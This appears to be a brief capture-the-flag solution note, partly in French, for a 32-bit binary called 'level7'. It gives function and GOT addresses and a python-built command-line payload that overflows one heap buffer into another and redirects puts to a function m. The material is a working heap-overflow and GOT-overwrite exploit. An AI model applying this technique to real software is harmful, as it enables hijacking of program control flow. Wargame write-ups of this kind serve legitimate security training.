m = 080484F4 = \xf4\x84\x04\x08
puts = \x28\x99\x04\x08

./level7 $(python -c "print ('a' * (16 + 4) + '\x28\x99\x04\x08')") $(python -c "print '\xf4\x84\x04\x08'")

il faut overflow le malloc de v6 sur v5 pour renvoyer le jump de puts sur la fonction m 